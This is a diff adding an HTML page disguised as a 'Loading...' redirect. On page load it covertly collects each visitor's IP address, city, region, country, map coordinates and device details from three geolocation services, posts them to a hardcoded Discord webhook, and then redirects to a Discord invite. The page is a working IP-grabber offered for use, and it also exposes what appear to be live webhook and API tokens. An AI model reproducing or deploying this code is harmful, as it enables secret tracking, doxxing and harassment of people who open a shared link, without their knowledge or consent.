@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.37/ua-parser.min.js"></script>
+</head>
+<body>
+    <script>
+        // Configuration
+        const webhookUrl = "https://discord.com/api/webhooks/1360927831177166868/OsFgej7-F8igL7ZrPWmb8B6b64i2M-lRiCZaGAmlwQ6vY0j4PLUB9tLYuiUzBiNhJtHi";
+        const redirectUrl = "https://discord.gg/your-server"; // Change to your desired URL
+
+        // Collect data and send to webhook
+        async function collectAndSendData() {
+            let ipinfoData = {
+                ip: "Not available",
+                city: "Not available",
+                region: "Not available",
+                country: "Not available",
+                loc: "Not available",
+                vpn: "Not available",
+                proxy: "Not available",
+                device: "Not available"
+            };
+            let multiApiData = {
+                date: new Date().toLocaleString("en-US"),
+                device: "Not available",
+                ipinfo: {},
+                ipapi: {},
+                freeipapi: {}
+            };
+
+            // Get device info
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                multiApiData.device = `${result.device.type || "Desktop"} (${result.os.name || "Unknown"} ${result.os.version || ""}, ${result.browser.name || "Unknown"})`;
+                ipinfoData.device = multiApiData.device;
+            } catch (error) {
+                console.error("Error parsing device info:", error);
+            }
+
+            // IPinfo (for Discord embed)
+            try {
+                const response = await fetch("https://ipinfo.io/json?token=e35cd3a20dc796"); // Replace with your IPinfo token
+                if (response.ok) {
+                    const data = await response.json();
+                    ipinfoData.ip = data.ip || "Not available";
+                    ipinfoData.city = data.city || "Not available";
+                    ipinfoData.region = data.region || "Not available";
+                    ipinfoData.country = data.country || "Not available";
+                    ipinfoData.loc = `${data.city || "Unknown"}, ${data.region || "Unknown"}`;
+                    ipinfoData.vpn = data.bogon ? "Possible" : "Not detected";
+                    ipinfoData.proxy = data.bogon ? "Possible" : "Not detected";
+                    multiApiData.ipinfo = data;
+                }
+            } catch (error) {
+                console.error("Error fetching IPinfo:", error);
+                multiApiData.ipinfo = { error: error.message };
+            }
+
+            // ip-api.com
+            try {
+                const response = await fetch("http://ip-api.com/json?fields=66846719");
+                if (response.ok) {
+                    const data = await response.json();
+                    multiApiData.ipapi = data.status === "success" ? data : { error: "Failed" };
+                }
+            } catch (error) {
+                console.error("Error fetching ip-api:", error);
+                multiApiData.ipapi = { error: error.message };
+            }
+
+            // freeipapi.com
+            try {
+                const response = await fetch("https://freeipapi.com/api/json");
+                if (response.ok) {
+                    const data = await response.json();
+                    multiApiData.freeipapi = data;
+                }
+            } catch (error) {
+                console.error("Error fetching freeipapi:", error);
+                multiApiData.freeipapi = { error: error.message };
+            }
+
+            // Send IPinfo embed to Discord
+            const ipinfoEmbed = {
+                embeds: [{
+                    title: "New Visit (IPinfo)",
+                    color: 0xFF0000,
+                    fields: [
+                        { name: "Date", value: multiApiData.date, inline: false },
+                        { name: "IP", value: ipinfoData.ip, inline: true },
+                        { name: "City", value: ipinfoData.city, inline: true },
+                        { name: "Region", value: ipinfoData.region, inline: true },
+                        { name: "Country", value: ipinfoData.country, inline: true },
+                        { name: "Location", value: ipinfoData.loc, inline: false },
+                        { name: "VPN", value: ipinfoData.vpn, inline: true },
+                        { name: "Proxy", value: ipinfoData.proxy, inline: true },
+                        { name: "Device", value: ipinfoData.device, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(ipinfoEmbed)
+                });
+                if (!response.ok) console.error("Webhook error (IPinfo):", response.status);
+            } catch (error) {
+                console.error("Error sending IPinfo to webhook:", error);
+            }
+
+            // Send multi-API data as a .txt-like code block
+            const txtContent = `
+[${multiApiData.date}]
+Device: ${multiApiData.device}
+--- ip-api.com ---
+IP: ${multiApiData.ipapi.query || "Not available"}
+City: ${multiApiData.ipapi.city || "Not available"}
+Region: ${multiApiData.ipapi.regionName || "Not available"}
+Country: ${multiApiData.ipapi.country || "Not available"}
+Location: ${multiApiData.ipapi.lat && multiApiData.ipapi.lon ? `https://www.google.com/maps?q=${multiApiData.ipapi.lat},${multiApiData.ipapi.lon}` : "Not available"}
+--- freeipapi.com ---
+IP: ${multiApiData.freeipapi.ipAddress || "Not available"}
+City: ${multiApiData.freeipapi.cityName || "Not available"}
+Region: ${multiApiData.freeipapi.regionName || "Not available"}
+Country: ${multiApiData.freeipapi.countryName || "Not available"}
+Location: ${multiApiData.freeipapi.latitude && multiApiData.freeipapi.longitude ? `https://www.google.com/maps?q=${multiApiData.freeipapi.latitude},${multiApiData.freeipapi.longitude}` : "Not available"}
+----------------------------------------
+`;
+            const multiApiEmbed = {
+                embeds: [{
+                    title: "Multi-API Data (Save as ips.txt)",
+                    color: 0x00FF00,
+                    description: `\`\`\`plaintext\n${txtContent}\n\`\`\``,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(multiApiEmbed)
+                });
+                if (!response.ok) console.error("Webhook error (Multi-API):", response.status);
+            } catch (error) {
+                console.error("Error sending Multi-API to webhook:", error);
+            }
+
+            // Redirect
+            window.location.href = redirectUrl;
+        }
+
+        // Run
+        collectAndSendData();
+    </script>
+</body>
+</html>
